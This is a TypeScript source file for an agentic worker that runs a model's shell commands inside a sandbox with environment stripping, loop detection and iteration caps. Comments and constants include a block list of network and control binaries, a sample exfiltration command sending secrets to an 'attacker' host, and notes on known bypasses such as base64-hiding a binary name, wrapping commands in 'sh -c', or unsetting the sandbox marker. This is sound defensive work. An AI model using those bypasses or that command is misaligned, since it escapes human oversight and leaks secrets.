/**
 * LM Studio Agentic Worker — standalone in-process OpenAI-style tool-calling loop.
 *
 * NOT a `GenericHttpRunner` subclass — generic-http-runner.ts:6-13 documents single-shot
 * round-trip contract incompatible with the tool loop. Re-uses `getLmStudioEndpoint()`
 * and `getLmStudioApiKey()` from `../config/providers.js`.
 *
 * Capabilities: `{ agentic: true, execution_model: 'tool_loop' }`.
 *
 * Architecture (per PLAN.md §Goal + LMSTUDIO-ERRATA-2026.md §4-9):
 *   1. Probe GET /v1/models (OpenAI-compat, per ERRATA E1) — refuse if model lacks
 *      `tool_use` capability. REST v0 (/api/v0/models) does NOT include capabilities.
 *   2. Build messages (system contextPrefix + LFM2 nudge if applicable, user task).
 *   3. Loop POST /v1/chat/completions { stream:false, tools, tool_choice:'auto' }:
 *      a. If choices[0].message.tool_calls absent → final answer, exit success.
 *      b. Execute each tool call (shell_exec / bash; cwd clamped to task.workdir; 32KB trunc).
 *      c. Append assistant message — spread reasoning_content if present (ERRATA E2 —
 *         Qwen 3.5/3.6 leak </think> into content otherwise).
 *      d. For empty tool_call_id (LM Studio bug #830, ERRATA E3) — append synthetic
 *         {role:'tool', tool_call_id:'__missing__', content:'ERROR: tool_call_id was empty'};
 *         do NOT crash — let the loop detector + iteration cap absorb the misbehavior.
 *      e. Append {role:'tool', tool_call_id, content} for each well-formed tool call.
 *      f. Hash-detector: 3 consecutive identical per-turn fingerprints → LOOP_DETECTED abort.
 *      g. Re-send tools[] every turn.
 *   4. Iteration cap 20; wall-clock cap via AbortController(task.timeout_ms).
 *
 * Test seams (PLAN.md T2): `fetchImpl`, `shellExec`, `maxIterations` constructor opts.
 */

import { createHash } from 'node:crypto';
import { execFile } from 'node:child_process';
import { z } from 'zod';

import { makeError } from '../errors.js';
import { getLmStudioEndpoint, getLmStudioApiKey } from '../config/providers.js';
import { AGENTIC_SANDBOX_ENV, isSecretEnvName } from '../security/env-sanitize.js';
import type { WorkerRunner, WorkerCapabilities } from './runner.js';
import type {
  WorkerTask,
  WorkerResult,
  ToolCall,
  ToolCallMessage,
} from './types.js';

// ─── Constants ────────────────────────────────────────────────────────────

/** Hard iteration cap (PLAN §T4). */
const DEFAULT_MAX_ITERATIONS = 20;

/** Maximum tool stdout bytes (PLAN §T3 sandbox spec). */
const TOOL_STDOUT_MAX_BYTES = 32_768;

/** Built-in tool names — both resolve to shell_exec handler (PLAN §T3 case 4). */
const SHELL_EXEC_NAMES = new Set<string>(['shell_exec', 'bash']);

/** LFM2 model regex (PLAN §T6). */
const LFM2_MODEL_RE = /^liquid\/lfm2-/i;

/**
 * Default shell_exec tool definition offered to the model when the caller
 * does not supply `task.tools`. Matches the contract in PLAN.md §Tool Execution
 * Sandbox Spec — single `command` arg, no schema-level cwd (cwd is clamped to
 * `task.workdir` by the executor regardless of model emission).
 */
export const DEFAULT_AGENTIC_TOOLS = [
  {
    type: 'function' as const,
    function: {
      name: 'shell_exec',
      description:
        'Execute a shell command (bash syntax) in the task workdir. Stdout is truncated at 32KB. ' +
        'Returns STDOUT/STDERR/EXIT. Use this for filesystem inspection, running tests, building, etc.',
      parameters: {
        type: 'object' as const,
        properties: {
          command: { type: 'string' as const, description: 'Shell command to run in the task workdir.' },
        },
        required: ['command'] as const,
        additionalProperties: false as const,
      },
    },
  },
];

/** Pythonic-output-suppression nudge (PLAN §T2 — pitfall 1.1). */
const LFM2_NUDGE =
  'Output function calls strictly as JSON in the tool_calls field, never as Python literals.';

/** Default system prompt when contextPrefix is absent (PLAN §T6 case 4 fallback). */
const DEFAULT_SYSTEM_PROMPT = 'You are a coding agent. Use the provided tools to complete the task.';

// ─── Types: OpenAI-compatible messages ────────────────────────────────────

export type ChatMessage =
  | { role: 'system'; content: string }
  | { role: 'user'; content: string }
  // reasoning_content (optional) preserved for ERRATA E2 — Qwen 3.5/3.6 multi-turn safety.
  | { role: 'assistant'; content: string | null; tool_calls?: ToolCall[]; reasoning_content?: string }
  | ToolCallMessage;

export interface ShellExecArgs {
  command: string;
  cwd: string;
  maxBytes: number;
}

export interface ShellExecResult {
  stdout: string;
  stderr: string;
  exitCode: number;
}

export type FetchFn = typeof fetch;
export type ShellExecFn = (args: ShellExecArgs) => Promise<ShellExecResult>;

/**
 * Per-tool handler for non-shell tools (Phase 7 onward — Figma REST tools,
 * Phase 8 — Relay control tools). Dispatched by name from `executeToolCall`;
 * result is JSON.stringified into the tool message content for the model.
 */
export interface NamedToolHandler {
  name: string;
  handle: (args: unknown, ctx: { workdir: string; pat: string }) => Promise<unknown>;
  /**
   * PAT or other credential needed by the handler. Passed as `ctx.pat`.
   * Optional since Phase 8 — credential-less tools (Relay control tools)
   * omit it; dispatch substitutes ''.
   */
  pat?: string;
}

export interface LmStudioAgenticRunnerOpts {
  fetchImpl?: FetchFn;
  shellExec?: ShellExecFn;
  maxIterations?: number;
  /**
   * Phase 7 — additional non-shell tools (e.g. Figma REST). Dispatched by name
   * in `executeToolCall`. Caller is responsible for resolving credentials
   * (e.g. `registerFigmaTools(process.env)` for Figma).
   */
  extraToolHandlers?: NamedToolHandler[];
}

// ─── Pure helpers (exported for test access — PLAN §T2) ────────────────

/**
 * Build the initial messages array for the first POST.
 *
 * Rules (PLAN §T2 + T6):
 *   - When task.contextPrefix is present → [system, user].
 *   - When task.contextPrefix is absent AND model is LFM2 → [system(nudge-only), user].
 *   - When task.contextPrefix is absent AND model is not LFM2 → [user] only.
 *   - When task.contextPrefix is present AND model is LFM2 → system content is contextPrefix + "\n\n" + nudge.
 */
export function buildInitialMessages(task: Pick<WorkerTask, 'task' | 'contextPrefix' | 'model'>): ChatMessage[] {
  const messages: ChatMessage[] = [];
  const nudge = buildLfm2Nudge(task.model);
  const prefix = task.contextPrefix?.trim() ? task.contextPrefix : '';

  if (prefix && nudge) {
    messages.push({ role: 'system', content: `${prefix}\n\n${nudge}` });
  } else if (prefix) {
    messages.push({ role: 'system', content: prefix });
  } else if (nudge) {
    messages.push({ role: 'system', content: nudge });
  }
  // task.task is the user payload — bareTask convention (see generic-http-runner.ts:49-58)
  messages.push({ role: 'user', content: task.task });
  return messages;
}

/**
 * Detect LFM2-family models and return the JSON-format nudge string.
 * Returns `null` for any non-LFM2 model. Case-insensitive match.
 */
export function buildLfm2Nudge(modelName: string | undefined | null): string | null {
  if (!modelName) return null;
  return LFM2_MODEL_RE.test(modelName) ? LFM2_NUDGE : null;
}

/**
 * Canonical JSON stringify — sorts object keys recursively before stringifying.
 * Ensures `hashToolCall('x', {a:1,b:2})` === `hashToolCall('x', {b:2,a:1})` (PLAN §T5 case 1).
 */
export function canonicalJsonStringify(value: unknown): string {
  if (value === null || typeof value !== 'object') return JSON.stringify(value);
  if (Array.isArray(value)) {
    return '[' + value.map((v) => canonicalJsonStringify(v)).join(',') + ']';
  }
  const keys = Object.keys(value as Record<string, unknown>).sort();
  const entries = keys.map((k) => `${JSON.stringify(k)}:${canonicalJsonStringify((value as Record<string, unknown>)[k])}`);
  return '{' + entries.join(',') + '}';
}

/**
 * sha256(name + '\x00' + canonicalJsonStringify(args)).
 * `args` may be already-parsed JSON object OR the raw arguments string (when parse fails).
 */
export function hashToolCall(name: string, args: unknown): string {
  const argsCanonical = typeof args === 'string' ? args : canonicalJsonStringify(args);
  return createHash('sha256').update(name).update('\x00').update(argsCanonical).digest('hex');
}

// ─── Tool execution sandbox (PLAN §T3) ────────────────────────────────────

const SHELL_EXEC_ARGS_SCHEMA = z
  .object({ command: z.string().min(1) })
  // passthrough() allows extra fields like a model-emitted `cwd` — but executor ignores them.
  // This silently DROPS them rather than rejecting (PLAN §T3 case 5: cwd clamp).
  .passthrough();

/**
 * Env vars passed through to the spawned shell. Everything else (notably
 * ANTHROPIC_API_KEY, OPENROUTER_API_KEY, GITHUB_TOKEN, etc.) is stripped to
 * prevent secret exfiltration via model-emitted shell commands.
 *
 * 08-fix HIGH: the `RELAY_*` namespace is NO LONGER forwarded. RELAY_DB_PATH
 * would hand the model the control DB path (direct sqlite mutation bypass);
 * RELAY_ALLOWED_ROOTS / RELAY_MEMORY_ALLOWED_WORKDIRS reveal and govern scoping.
 * A model-emitted command needs none of these for a workdir task.
 */
const SHELL_EXEC_ENV_ALLOW = new Set<string>([
  'PATH',
  'HOME',
  'USER',
  'LANG',
  'LC_ALL',
  'TERM',
  'TMPDIR',
]);

/**
 * Build a sanitized env from the allow-list only. Secret-shaped names and the
 * whole RELAY_* control/config namespace are dropped (08-fix). The agentic
 * sandbox marker is intentionally NOT copied from the source here — it is
 * force-injected per child by defaultShellExec AFTER this strip, so a
 * model-controlled spawn env cannot pre-empt or blank it.
 */
export function buildShellExecEnv(source: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const [key, value] of Object.entries(source)) {
    if (value === undefined) continue;
    // The marker is re-injected separately; never trust a source-provided value.
    if (key === AGENTIC_SANDBOX_ENV) continue;
    // Deny secret-shaped names even when allow-listed.
    if (isSecretEnvName(key)) continue;
    // Drop the entire RELAY_* control/config namespace.
    if (key.startsWith('RELAY_')) continue;
    if (SHELL_EXEC_ENV_ALLOW.has(key)) {
      out[key] = value;
    }
  }
  return out;
}

/**
 * Coarse network-binary blocklist — pragmatic stopgap until a real OS sandbox
 * (sandbox-exec on macOS, unshare on Linux) lands in v0.3.
 *
 * Threat model: cwd-clamp prevents disk writes outside task.workdir, but a model
 * can still exfiltrate data via outbound network (`curl http://attacker/leak?$(cat secrets)`).
 * Until we have real network namespace isolation, reject commands whose first
 * token (per command segment) is a known network binary.
 *
 * LIMITATIONS (documented; not bugs):
 *   - Does not block child processes (e.g. `node -e "fetch(...)"`).
 *   - Does not block raw socket syscalls or alternative binaries.
 *   - Bypassable by base64-decoding the binary name at runtime.
 *   This is a crude defense-in-depth layer, NOT a sandbox.
 */
export const NETWORK_BINARY_BLOCKLIST: ReadonlySet<string> = new Set([
  'curl',
  'wget',
  'nc',
  'ncat',
  'netcat',
  'ssh',
  'scp',
  'sftp',
  'rsync',
  'ftp',
  'tftp',
  'telnet',
  'http',
  'httpie',
  'dig',
  'nslookup',
  'host',
  'whois',
  'traceroute',
  'tracepath',
  'ping',
  'ping6',
  'mtr',
  'socat',
]);

/**
 * Yield the head (first whitespace-delimited token) of each command segment,
 * with its basename. Tokenizes by command-separator characters (`;`, `&&`,
 * `||`, `|`); strips a leading backslash escape (`\curl`); basenames an
 * absolute path (`/usr/bin/curl` → `curl`). Shared by the network and control
 * binary blocklists so both use the SAME detection mechanism (08-fix).
 *
 * Does NOT flag blocked names appearing as non-head tokens (e.g. `echo "curl
 * docs"` is allowed because the head of the only segment is `echo`).
 */
function* segmentHeads(cmd: string): Generator<{ segment: string; basename: string }> {
  const segments = cmd.split(/;|&&|\|\||\|/);
  for (const rawSegment of segments) {
    const segment = rawSegment.trim();
    if (!segment) continue;
    const head = segment.replace(/^\\/, '').split(/\s+/)[0] ?? '';
    if (!head) continue;
    const basename = head.split('/').pop() ?? head;
    yield { segment, basename };
  }
}

/**
 * Inspect a shell command string and report the first blocked network-binary
 * token, if any (basename match — `/usr/bin/curl` → `curl`).
 */
export function containsBlockedNetworkBinary(
  cmd: string
): { blocked: true; binary: string } | { blocked: false } {
  for (const { segment, basename } of segmentHeads(cmd)) {
    const lower = basename.toLowerCase();
    // openssl s_client special-case: `openssl s_client -connect ...`
    if (lower === 'openssl') {
      const args = segment.replace(/^\S+\s*/, '').trimStart();
      if (/^s_client\b/i.test(args)) {
        return { blocked: true, binary: 'openssl s_client' };
      }
      continue;
    }
    if (NETWORK_BINARY_BLOCKLIST.has(lower)) {
      return { blocked: true, binary: lower };
    }
  }
  return { blocked: false };
}

/**
 * Control-plane binaries blocked inside shell_exec (08-fix HIGH). A model must
 * drive control sessions through the in-process relay_session_* tools
 * (caller-bound, default-deny), never by shelling out to the human `relay` CLI
 * which always acts as kind:human and would let the model mint its own
 * authority.
 *
 * This is best-effort hardening, not a hard boundary: it matches the
 * network-binary tokenizer exactly, so the same residuals apply (a head hidden
 * behind `sh -c "relay ..."`, a copied/renamed binary, etc.). The deeper
 * defense is the RELAY_AGENTIC_SANDBOX marker + the cmd-session CLI guard, which
 * refuses even when a `relay` binary does execute. See SECURITY.md.
 */
export const CONTROL_BINARY_BLOCKLIST: ReadonlySet<string> = new Set<string>(['relay']);

/**
 * Inspect a shell command string and report the first blocked control-binary
 * head, if any (basename match — `/usr/local/bin/relay` → `relay`). Uses the
 * SAME tokenizer as containsBlockedNetworkBinary.
 */
export function containsBlockedControlBinary(
  cmd: string
): { blocked: true; binary: string } | { blocked: false } {
  for (const { basename } of segmentHeads(cmd)) {
    const lower = basename.toLowerCase();
    if (CONTROL_BINARY_BLOCKLIST.has(lower)) {
      return { blocked: true, binary: lower };
    }
  }
  return { blocked: false };
}

/** Default real-shell executor. Truncates stdout/stderr at maxBytes (byte-safe). */
const defaultShellExec: ShellExecFn = (args: ShellExecArgs) =>
  new Promise<ShellExecResult>((resolve) => {
    execFile(
      '/bin/sh',
      ['-c', args.command],
      {
        cwd: args.cwd,
        timeout: 30_000,
        maxBuffer: 64 * 1024,
        // Force the agentic-sandbox marker on AFTER the strip (08-fix): every
        // shell_exec child is, by definition, a sandboxed agentic shell. Any
        // `relay` binary that runs as a descendant inherits this and the
        // cmd-session CLI guard refuses its mutating subcommands. A model can
        // still unset it inline (`RELAY_AGENTIC_SANDBOX= relay ...`) — that
        // residual is documented in SECURITY.md.
        env: { ...buildShellExecEnv(process.env), [AGENTIC_SANDBOX_ENV]: '1' },
      },
      (err, stdout, stderr) => {
        const exitCode =
          err && typeof (err as NodeJS.ErrnoException & { code?: number }).code === 'number'
            ? ((err as NodeJS.ErrnoException & { code: number }).code as number)
            : err
              ? 1
              : 0;
        const stdoutAny = stdout as unknown;
        const stderrAny = stderr as unknown;
        const stdoutStr: string =
          typeof stdoutAny === 'string'
            ? stdoutAny
            : Buffer.isBuffer(stdoutAny)
              ? (stdoutAny as Buffer).toString('utf-8')
              : '';
        const stderrStr: string =
          typeof stderrAny === 'string'
            ? stderrAny
            : Buffer.isBuffer(stderrAny)
              ? (stderrAny as Buffer).toString('utf-8')
              : '';
        resolve({ stdout: stdoutStr, stderr: stderrStr, exitCode });
      }
    );
  });

/**
 * Byte-safe truncation: slice the UTF-8 buffer at `maxBytes`, append marker.
 * Repairs any final-char split codepoint by trimming to last clean UTF-8 boundary.
 */
function truncateBytes(input: string, maxBytes: number): { text: string; truncated: boolean; originalBytes: number } {
  const buf = Buffer.from(input, 'utf-8');
  const originalBytes = buf.length;
  if (originalBytes <= maxBytes) return { text: input, truncated: false, originalBytes };
  const sliced = buf.subarray(0, maxBytes);
  let text = sliced.toString('utf-8');
  // toString('utf-8') already handles split codepoints by emitting U+FFFD; we accept that.
  // Append marker AFTER truncation — total may exceed maxBytes by marker length (PLAN §T3 case 6).
  text = `${text}\n…[TRUNCATED: original ${originalBytes} bytes]`;
  return { text, truncated: true, originalBytes };
}

/**
 * Format the combined stdout/stderr/exit payload that gets sent back to the model.
 * Combined stream is clamped at TOOL_STDOUT_MAX_BYTES (PLAN §T3 32KB truncation spec).
 */
function formatShellResult(result: ShellExecResult): string {
  const stdoutPart = truncateBytes(result.stdout, TOOL_STDOUT_MAX_BYTES).text;
  const stderrPart = truncateBytes(result.stderr, TOOL_STDOUT_MAX_BYTES).text;
  return `STDOUT:\n${stdoutPart}\n\nSTDERR:\n${stderrPart}\n\nEXIT: ${result.exitCode}`;
}

/**
 * Execute a single shell_exec/bash tool call. cwd is ALWAYS task.workdir — any
 * model-emitted `cwd` field is silently dropped (PLAN §T3 case 5).
 */
export async function executeShellExec(
  rawArgs: unknown,
  workdir: string,
  shellExec: ShellExecFn
): Promise<string> {
  const parsed = SHELL_EXEC_ARGS_SCHEMA.parse(rawArgs);
  const netCheck = containsBlockedNetworkBinary(parsed.command);
  if (netCheck.blocked) {
    throw new Error(
      `Network-binary ${netCheck.binary} blocked. Outbound network is denied in shell_exec sandbox. Use a Relay tool or whitelist via --unsafe-shell (not yet implemented).`
    );
  }
  const ctrlCheck = containsBlockedControlBinary(parsed.command);
  if (ctrlCheck.blocked) {
    throw new Error(
      `Control binary ${ctrlCheck.binary} blocked in shell_exec sandbox. ` +
        `Drive control sessions through the in-process relay_session_* tools ` +
        `(caller-bound, default-deny); the human relay CLI cannot be invoked from a sandboxed agent.`
    );
  }
  const result = await shellExec({
    command: parsed.command,
    cwd: workdir,
    maxBytes: TOOL_STDOUT_MAX_BYTES,
  });
  return formatShellResult(result);
}

/**
 * Dispatch a single tool call. Always returns a ToolCallMessage — never throws.
 * Errors become `content: 'ERROR: <msg>'` so the model can self-correct (PLAN §T3 case 1-2, R8).
 *
 * tool_call_id MUST be byte-exact echo (PLAN §T3 case 7, R7).
 *
 * Phase 7: when `extraToolHandlers` is provided (e.g. Figma REST tools from
 * registerFigmaTools), the dispatcher first tries to match `call.function.name`
 * against the handler map; on match it invokes `handle(args, ctx)` and stringifies
 * the result. Falls through to SHELL_EXEC_NAMES dispatch on no match.
 */
export async function executeToolCall(
  call: ToolCall,
  workdir: string,
  shellExec: ShellExecFn,
  extraToolHandlers?: readonly NamedToolHandler[]
): Promise<ToolCallMessage> {
  const name = call.function.name;

  // Phase 7 — try named handlers first (Figma REST tools, etc.)
  const extra = extraToolHandlers?.find((h) => h.name === name);
  if (extra) {
    let parsedArgs: unknown;
    try {
      parsedArgs = JSON.parse(call.function.arguments);
    } catch {
      return { role: 'tool', tool_call_id: call.id, content: 'ERROR: arguments not valid JSON' };
    }
    try {
      const result = await extra.handle(parsedArgs, { workdir, pat: extra.pat ?? '' });
      const content = typeof result === 'string' ? result : JSON.stringify(result);
      return { role: 'tool', tool_call_id: call.id, content };
    } catch (err) {
      // Handler errors come back already-scrubbed from rest-client (Phase 7 T2),
      // but cast through String() guards any non-Error throw.
      const msg = err instanceof Error ? err.message : String(err);
      return { role: 'tool', tool_call_id: call.id, content: `ERROR: ${msg}` };
    }
  }

  if (!SHELL_EXEC_NAMES.has(name)) {
    return { role: 'tool', tool_call_id: call.id, content: `ERROR: unknown tool ${name}` };
  }
  let parsedArgs: unknown;
  try {
    parsedArgs = JSON.parse(call.function.arguments);
  } catch {
    return { role: 'tool', tool_call_id: call.id, content: 'ERROR: arguments not valid JSON' };
  }
  try {
    const content = await executeShellExec(parsedArgs, workdir, shellExec);
    return { role: 'tool', tool_call_id: call.id, content };
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    return { role: 'tool', tool_call_id: call.id, content: `ERROR: ${msg}` };
  }
}

// ─── Capability probe (PLAN §T4 case 7) ───────────────────────────────────

interface CapabilityModelEntry {
  id: string;
  capabilities?: string[];
}

interface CapabilityProbeBody {
  data?: CapabilityModelEntry[];
}

/**
 * Probe LM Studio for the target model's `tool_use` capability.
 *
 * ERRATA E1 with live-LM-Studio refinement: per LMSTUDIO-ERRATA-2026 §4, /v1/models
 * is the documented OpenAI-compat capabilities source — BUT live testing against
 * LM Studio 0.4.13+ (2026-05) showed /v1/models can omit the capabilities key for
 * non-loaded models, while /api/v0/models reliably includes it for ALL listed
 * models. So we probe BOTH:
 *
 *   1. Try /v1/models first (matches OpenAI ecosystem expectations).
 *   2. If entry found but capabilities key absent → fall back to /api/v0/models.
 *   3. Aggregate: any endpoint reporting "tool_use" wins (fail-open on the
 *      OR of both responses), since both endpoints are authoritative per docs.
 *
 * Fail-closed if:
 *   - both endpoints unreachable → PROVIDER_ERROR retryable
 *   - model not present in either → INVALID_ARGS with `lms load` hint
 *   - capabilities absent from BOTH endpoints → INVALID_ARGS (LM Studio too old)
 *   - capabilities present but no "tool_use" in either → INVALID_ARGS
 *
 * Returns `null` on success.
 */
async function probeCapability(
  endpoint: string,
  model: string,
  headers: Record<string, string>,
  fetchImpl: FetchFn,
  signal: AbortSignal
): Promise<ReturnType<typeof makeError> | null> {
  const base = endpoint.replace(/\/+$/, '');

  async function fetchCapsAt(path: string): Promise<{ entry?: CapabilityModelEntry; networkErr?: string; httpErr?: number }> {
    try {
      const res = await fetchImpl(`${base}${path}`, { method: 'GET', headers, signal });
      if (!res.ok) return { httpErr: res.status };
      const body = (await res.json().catch(() => ({}))) as CapabilityProbeBody;
      const entry = body.data?.find((m) => m.id === model);
      return entry ? { entry } : {};
    } catch (err) {
      return { networkErr: err instanceof Error ? err.message : String(err) };
    }
  }

  // ERRATA E1: /v1/models (OpenAI-compat) is the primary probe.
  const v1 = await fetchCapsAt('/v1/models');
  // Live-LM-Studio refinement: /api/v0/models is the reliable fallback when
  // /v1/models omits capabilities. Probed in parallel-style only when needed.
  // MED codex finding: ALSO fall back when v1 has a caps array that does NOT
  // include 'tool_use' — v0 may carry richer caps and v1 omission shouldn't
  // false-refuse a tool-capable model.
  let v0: { entry?: CapabilityModelEntry; networkErr?: string; httpErr?: number } | null = null;
  const v1HasToolUse =
    !!v1.entry?.capabilities && Array.isArray(v1.entry.capabilities) && v1.entry.capabilities.includes('tool_use');
  const needV0Fallback =
    !!v1.networkErr || !!v1.httpErr || !v1.entry || !Array.isArray(v1.entry.capabilities) || !v1HasToolUse;
  if (needV0Fallback) {
    v0 = await fetchCapsAt('/api/v0/models');
  }

  // Both endpoints failed at network/HTTP layer → PROVIDER_ERROR
  if ((v1.networkErr || v1.httpErr) && v0 && (v0.networkErr || v0.httpErr)) {
    const msg = v1.networkErr ?? v0.networkErr ?? `HTTP ${v1.httpErr ?? v0.httpErr}`;
    return makeError('PROVIDER_ERROR', `LM Studio capability probe failed: ${msg}`, true);
  }

  // Model not present on either endpoint
  const entry = v1.entry ?? v0?.entry;
  if (!entry) {
    return makeError(
      'INVALID_ARGS',
      `model "${model}" is not loaded in LM Studio. Run: lms load ${model}`,
      false
    );
  }

  // Aggregate capabilities from both endpoints (whichever has the array)
  const capsList: string[] = [];
  if (Array.isArray(v1.entry?.capabilities)) capsList.push(...v1.entry!.capabilities);
  if (Array.isArray(v0?.entry?.capabilities)) capsList.push(...v0!.entry!.capabilities);

  if (capsList.length === 0) {
    return makeError(
      'INVALID_ARGS',
      `LM Studio capability metadata missing for "${model}" on both /v1/models and /api/v0/models — upgrade LM Studio to ≥ 0.3.16`,
      false
    );
  }
  if (!capsList.includes('tool_use')) {
    return makeError(
      'INVALID_ARGS',
      `model "${model}" does not advertise the 'tool_use' capability — agentic dispatch refused`,
      false
    );
  }
  return null;
}

// ─── Main loop ───────────────────────────────────────────────────────────

interface ChatCompletionResponse {
  choices?: Array<{
    message?: {
      role: string;
      content?: string | null;
      tool_calls?: ToolCall[];
      // ERRATA E2 — Qwen 3.5/3.6 emit reasoning_content alongside tool_calls.
      // If we don't echo it back on the assistant message, the next-turn output
      // leaks `</think>` into `content` (QwenLM/Qwen3.6 issue #26).
      reasoning_content?: string;
    };
    finish_reason?: string;
  }>;
  usage?: {
    prompt_tokens?: number;
    completion_tokens?: number;
    total_tokens?: number;
  };
}

/** Synthetic tool_call_id used when model emits empty id (LM Studio bug #830, ERRATA E3). */
const EMPTY_ID_SENTINEL = '__missing__';

export class LmStudioAgenticRunner implements WorkerRunner {
  readonly capabilities: WorkerCapabilities = {
    agentic: true,
    execution_model: 'tool_loop',
  };

  private readonly fetchImpl: FetchFn;
  private readonly shellExec: ShellExecFn;
  private readonly maxIterations: number;
  private readonly extraToolHandlers: readonly NamedToolHandler[];

  constructor(opts: LmStudioAgenticRunnerOpts = {}) {
    this.fetchImpl = opts.fetchImpl ?? ((globalThis as { fetch: FetchFn }).fetch);
    this.shellExec = opts.shellExec ?? defaultShellExec;
    this.maxIterations = opts.maxIterations ?? DEFAULT_MAX_ITERATIONS;
    this.extraToolHandlers = opts.extraToolHandlers ?? [];
  }

  async run(task: WorkerTask): Promise<WorkerResult> {
    const startedAt = Date.now();
    let iterations = 0;
    let tool_call_count = 0;
    let total_tokens = 0;
    let prompt_tokens = 0;
    let completion_tokens = 0;

    // 1. Validate tools[]
    if (!task.tools || task.tools.length === 0) {
      return this.errorResult(startedAt, iterations, tool_call_count, makeError(
        'INVALID_ARGS',
        'lmstudio-agentic requires task.tools[] (non-empty)',
        false
      ));
    }
    if (!task.model?.trim()) {
      return this.errorResult(startedAt, iterations, tool_call_count, makeError(
        'INVALID_ARGS',
        'lmstudio-agentic requires task.model',
        false
      ));
    }

    const endpoint = getLmStudioEndpoint();
    const apiKey = getLmStudioApiKey();
    const headers: Record<string, string> = { 'Content-Type': 'application/json' };
    if (apiKey) headers['Authorization'] = `Bearer ${apiKey}`;

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), task.timeout_ms);

    try {
      // 2. Capability probe (PLAN §T4 case 7)
      const probeErr = await probeCapability(endpoint, task.model, headers, this.fetchImpl, controller.signal);
      if (probeErr) {
        return this.errorResult(startedAt, iterations, tool_call_count, probeErr);
      }

      // 3. Build initial messages — system (contextPrefix [+ LFM2 nudge]) + user
      const messages: ChatMessage[] = buildInitialMessages(task);
      // If no system prompt was created (no contextPrefix, no LFM2 nudge), inject the
      // default — agentic workers need a system primer so the model knows it has tools.
      if (!messages.some((m) => m.role === 'system')) {
        messages.unshift({ role: 'system', content: DEFAULT_SYSTEM_PROMPT });
      }

      const chatUrl = `${endpoint.replace(/\/+$/, '')}/v1/chat/completions`;
      const recentTurnHashes: string[] = [];

      for (iterations = 1; iterations <= this.maxIterations; iterations++) {
        // 4. POST chat completion
        const body = {
          model: task.model,
          messages,
          tools: task.tools,
          tool_choice: 'auto',
          stream: false,
          temperature: 0.2,
        };

        let resp: Response;
        try {
          resp = await this.fetchImpl(chatUrl, {
            method: 'POST',
            headers,
            body: JSON.stringify(body),
            signal: controller.signal,
          });
        } catch (err) {
          if (controller.signal.aborted) {
            return {
              status: 'timeout',
              output: '',
              duration_ms: Date.now() - startedAt,
              exit_code: null,
              iterations,
              tool_call_count,
              error: makeError('TIMEOUT', `lmstudio-agentic timed out after ${task.timeout_ms}ms`, true),
            };
          }
          return this.errorResult(startedAt, iterations, tool_call_count, makeError(
            'PROVIDER_ERROR',
            `LM Studio fetch failed: ${err instanceof Error ? err.message : String(err)}`,
            true
          ));
        }

        if (!resp.ok) {
          const errText = await resp.text().catch(() => '');
          return this.errorResult(startedAt, iterations, tool_call_count, makeError(
            'PROVIDER_ERROR',
            `LM Studio returned ${resp.status}: ${errText.slice(0, 500)}`,
            true
          ));
        }

        const parsed = (await resp.json().catch(() => ({}))) as ChatCompletionResponse;
        if (parsed.usage) {
          total_tokens += parsed.usage.total_tokens ?? 0;
          prompt_tokens += parsed.usage.prompt_tokens ?? 0;
          completion_tokens += parsed.usage.completion_tokens ?? 0;
        }
        const choice = parsed.choices?.[0];
        if (!choice?.message) {
          return this.errorResult(startedAt, iterations, tool_call_count, makeError(
            'PROVIDER_ERROR',
            'LM Studio response missing choices[0].message',
            true
          ));
        }

        // Append assistant message (the model's reply, possibly with tool_calls).
        // ERRATA E2: spread reasoning_content verbatim when present — Qwen 3.5/3.6
        // multi-turn loops leak `</think>` into `content` if reasoning_content isn't
        // echoed back on the assistant message (QwenLM/Qwen3.6 issue #26).
        messages.push({
          role: 'assistant',
          content: choice.message.content ?? null,
          ...(choice.message.tool_calls ? { tool_calls: choice.message.tool_calls } : {}),
          ...(choice.message.reasoning_content
            ? { reasoning_content: choice.message.reasoning_content }
            : {}),
        });

        const toolCalls = choice.message.tool_calls;
        if (!toolCalls || toolCalls.length === 0) {
          // 5a. No tool calls → final answer; return success.
          return {
            status: 'success',
            output: choice.message.content ?? '',
            duration_ms: Date.now() - startedAt,
            exit_code: 0,
            iterations,
            tool_call_count,
            token_usage: total_tokens || null,
            prompt_tokens: prompt_tokens || null,
            completion_tokens: completion_tokens || null,
          };
        }

        // 5b. Loop-detector check (PLAN §T5): combined-turn fingerprint.
        // Per-turn fingerprint = sha256(sorted-joined per-call hashes). This is a defensible
        // extension of REQ AGENTIC-02 to handle parallel tool_calls — single-call behavior is
        // preserved because 1 call per turn yields fingerprint == single hash (VERIFICATION W2).
        const turnHash = computeTurnFingerprint(toolCalls);
        recentTurnHashes.push(turnHash);
        if (recentTurnHashes.length > 3) recentTurnHashes.shift();
        if (recentTurnHashes.length === 3 && new Set(recentTurnHashes).size === 1) {
          return this.errorResult(startedAt, iterations, tool_call_count, makeError(
            'UNSUPPORTED',
            'LOOP_DETECTED: same tool-call signature 3 turns in a row',
            false
          ));
        }

        // 6. Execute tool calls and append results.
        // ERRATA E3: defensive empty-id handling (LM Studio bug #830) — synthesize
        // a sentinel id and ERROR tool message so the model can self-correct without
        // crashing the loop. The loop detector + iteration cap absorb misbehavior.
        for (const tc of toolCalls) {
          tool_call_count++;
          if (typeof tc.id !== 'string' || tc.id.length === 0) {
            messages.push({
              role: 'tool',
              tool_call_id: EMPTY_ID_SENTINEL,
              content: 'ERROR: tool_call_id was empty (LM Studio bug #830) — please re-emit with a non-empty id',
            });
            continue;
          }
          const toolResult = await executeToolCall(tc, task.workdir, this.shellExec, this.extraToolHandlers);
          messages.push(toolResult);
        }
      }

      // 7. Loop exit without resolution → iteration cap hit (PLAN §T4 case 3).
      // Report `this.maxIterations` — the actual work count completed. (The for-loop
      // post-increments `iterations` to maxIterations+1 on exit, so we don't use it.)
      // Matches the timeout path which returns the in-flight iteration number.
      return this.errorResult(startedAt, this.maxIterations, tool_call_count, makeError(
        'UNSUPPORTED',
        `lmstudio-agentic iteration cap hit (${this.maxIterations} iterations)`,
        false
      ));
    } finally {
      clearTimeout(timer);
    }
  }

  private errorResult(
    startedAt: number,
    iterations: number,
    tool_call_count: number,
    error: ReturnType<typeof makeError>
  ): WorkerResult {
    return {
      status: 'error',
      output: '',
      duration_ms: Date.now() - startedAt,
      exit_code: null,
      iterations,
      tool_call_count,
      error,
    };
  }
}

/**
